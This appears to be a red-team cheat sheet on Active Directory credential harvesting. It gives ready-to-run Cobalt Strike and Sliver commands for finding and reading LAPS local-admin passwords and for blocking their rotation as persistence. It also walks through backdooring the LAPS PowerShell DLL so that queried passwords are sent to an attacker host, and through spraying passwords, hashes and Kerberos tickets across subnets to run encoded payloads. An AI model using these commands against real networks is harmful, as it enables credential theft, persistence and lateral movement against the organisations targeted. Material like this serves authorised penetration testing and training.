## Credential Harvesting

Domain-level credential acquisition beyond host-based dumping. Focused on LAPS password retrieval and network-wide credential testing.

> [!Note]
> DPAPI (Credential Manager, Scheduled Task Credentials) and host-based dumping are covered in [[4. Post-Exploitation/e. Credential Dumping]].

---

### Finding LAPS

LAPS (Local Administrator Password Solution) manages local admin passwords — each machine gets a unique, randomly rotating password stored in AD (`ms-Mcs-AdmPwd`).

```sh
# Check if LAPS client is installed on the current machine
beacon> ls C:\Program Files\LAPS\CSE

# Find LAPS GPOs
beacon> powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Find computers with LAPS configured (ExpirationTime not null — any domain user can read this)
beacon> powershell Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName

# Download and parse LAPS Registry.pol for policy details
beacon> download \\<domain>\SysVol\<domain>\Policies\{<GPO_GUID>}\Machine\Registry.pol
PS> Parse-PolFile .\Desktop\Registry.pol
```

---

### Reading LAPS Passwords

Only principals with delegated read access to `ms-Mcs-AdmPwd` can retrieve passwords.

#### CS

```sh
# Find who can read ms-Mcs-AdmPwd (check DACL)
beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier

# LAPSToolkit — find delegated groups
beacon> powershell-import C:\Tools\LAPSToolkit.ps1
beacon> powershell Find-LAPSDelegatedGroups
beacon> powershell Find-AdmPwdExtendedRights    # users with "All Extended Rights"

# Read the password (if you have access)
beacon> powershell Get-DomainComputer -Identity <hostname> -Properties ms-Mcs-AdmPwd

# Use the retrieved password
beacon> make_token .\LapsAdmin <password>
```

#### Sliver

```sh
# SharpLAPS — without /target: gets all accessible machines
sharplaps /host:<dc_hostname>
sharplaps /host:<dc_hostname> /target:<target_hostname>

# SharpView
sharpview -- 'Get-DomainComputer -Identity <hostname> -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime'
sharpview -- 'Get-DomainComputer -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime'

# PowerView via sharpsh
sharpsh -t 20 -- '-u http://<attacker>/PowerView.ps1 -c "Get-DomainComputer <hostname>"'
```

---

### LAPS Persistence — Password Expiration

If `PwdExpirationProtectionEnabled` is disabled (default when not configured), you can set the expiration time far into the future to prevent rotation.

```sh
# Read current expiration time
beacon> powershell Get-DomainComputer -Identity <hostname> -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

# Convert timestamp: https://www.epochconverter.com/ldap
# Set expiration far in the future (LDAP timestamp)
beacon> powershell Set-DomainObject -Identity <hostname> -Set @{'ms-Mcs-AdmPwdExpirationTime' = '<future_timestamp>'}
```

> [!Warning]
> If `PwdExpirationProtectionEnabled` is enabled, attempting to set expiration beyond the policy maximum triggers an automatic password reset.

---

### LAPS Backdoor

Modify the LAPS PowerShell module DLL to exfiltrate passwords when an admin queries them. Breaks the digital signature but PowerShell still loads it.

```sh
# 1. Download the DLL
beacon> download C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\AdmPwd.PS.dll

# 2. Open AdmPwd.PS.dll in dnSpy
#    Navigate to: Assembly Explorer > AdmPwd.PS > [namespace] > GetPassword method
#    Right-click > Edit Method
#    Add System.Net assembly reference
#    Add WebClient.DownloadString call to exfil: http://<attacker>/<computer_name>&<password>
#    Compile > File > Save Module

# 3. Upload the modified DLL
beacon> upload C:\Users\Attacker\Desktop\AdmPwd.PS.dll

# Password queries will now hit your web log
```

---

### Password Spraying

Test credentials, hashes, or tickets across the network.

```sh
# Domain credentials
nxc smb <subnet>/24 -d <domain> -u <user> -p <password>
nxc winrm <subnet>/24 -d <domain> -u <user> -p <password>
nxc ssh <subnet>/24 -u <user>@<domain> -p <password>

# NTLM hash
nxc smb <subnet>/24 -d <domain> -u <user> -H <hash>
nxc winrm <subnet>/24 -d <domain> -u <user> -H <hash>

# Local administrator
nxc smb <subnet>/24 -d . -u Administrator -H <hash>

# Kerberos ticket (from ccache)
nxc smb <subnet>/24 --use-kcache

# Share enumeration with creds
nxc smb <subnet>/24 -d <domain> -u <user> -p <password> --shares

# Execute command on accessible hosts
nxc smb <target> -d <domain> -u <user> -H <hash> --exec-method atexec -x 'powershell -enc <BASE64_PAYLOAD>'
nxc smb <target> --use-kcache --exec-method atexec -x 'powershell -enc <BASE64_PAYLOAD>'

# MSSQL spray
mssqlpwner <domain>/<user>:<password>@<target> -windows-auth enumerate
mssqlpwner ./<user>@<target> -hashes ':<hash>' -windows-auth enumerate
mssqlpwner <domain>/<machine>\$@<target> -hashes ':<hash>' -windows-auth interactive enumerate
```
